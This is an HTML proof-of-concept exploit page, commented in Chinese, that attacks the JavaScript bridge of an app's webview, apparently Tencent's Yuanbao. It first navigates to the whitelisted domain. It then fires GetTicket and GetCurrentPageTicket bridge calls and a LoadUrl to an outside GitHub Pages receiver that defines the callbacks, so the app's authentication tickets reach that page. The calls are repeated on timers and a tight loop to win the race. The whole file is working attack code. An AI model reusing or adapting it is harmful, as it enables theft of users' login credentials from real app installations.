<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race Steal PoC</title></head>
<body>
<h2>JSBridge Race - GetTicket Chain</h2>
<pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

var callCount = 0;
function callJSBridge(module, method, param, cbName) {
    callCount++;
    var callId = module + '_' + method + '_' + callCount + '_' + Date.now();
    if (!cbName) cbName = 'cb_' + callId.replace(/[^a-zA-Z0-9_]/g, '_');
    var req = { callback: cbName, module: module, method: method, param: param || {}, callId: callId };
    window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
}

// recv.html 的地址
var RECV_URL = "https://zhuos6678-test.github.io/huiyitest112233.github.io/recv.html";

function doRace() {
    if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
    addLog('=== Race Steal: GetTicket ===');
    addLog('URL: ' + location.href);

    // 1. navigate 到白名单域名
    location.href = "https://yuanbao.tencent.com/";

    // 2. 竞态窗口中：先发 GetTicket，再发 LoadUrl
    //    GetTicket 用固定 callback 名 "steal_cb"，recv.html 会定义这个函数
    //    GetTicket 在前，LoadUrl 在后，这样：
    //      - GetTicket 到达主进程时 URL=yuanbao → PASS → handler 执行
    //      - LoadUrl 到达主进程 → 加载 recv.html
    //      - GetTicket callback (evaluateJavascript) 到达时 recv.html 已加载 → steal_cb 被调用

    var delays = [0, 30, 60, 100, 150, 200, 250, 300, 400, 500];
    for (var d = 0; d < delays.length; d++) {
        (function(delay) {
            setTimeout(function() {
                try {
                    // 先发 GetTicket（3 种 ticket_type）
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 1}, 'steal_cb_w10');
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 2}, 'steal_cb_w14');
                    callJSBridge('CommonPlugin', 'GetCurrentPageTicket', {}, 'steal_cb_page');
                    // 再发 LoadUrl 加载 recv.html
                    callJSBridge('CommonPlugin', 'LoadUrl', {url: RECV_URL}, 'steal_cb_load');
                    addLog('[' + delay + 'ms] GetTicket x3 + LoadUrl sent');
                } catch(e) {
                    addLog('[' + delay + 'ms] ERR: ' + e.message);
                }
            }, delay);
        })(delays[d]);
    }

    // 高频 setInterval 版本
    var intervalCount = 0;
    var iv = setInterval(function() {
        intervalCount++;
        try {
            callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
            callJSBridge('CommonPlugin', 'LoadUrl', {url: RECV_URL}, 'steal_cb_load');
        } catch(e) {
            clearInterval(iv);
        }
        if (intervalCount > 100) clearInterval(iv);
    }, 0);

    addLog('Race started');
}

setTimeout(function() {
    addLog('Starting in 2s...');
    setTimeout(doRace, 2000);
}, 500);
</script>
</body>
</html>
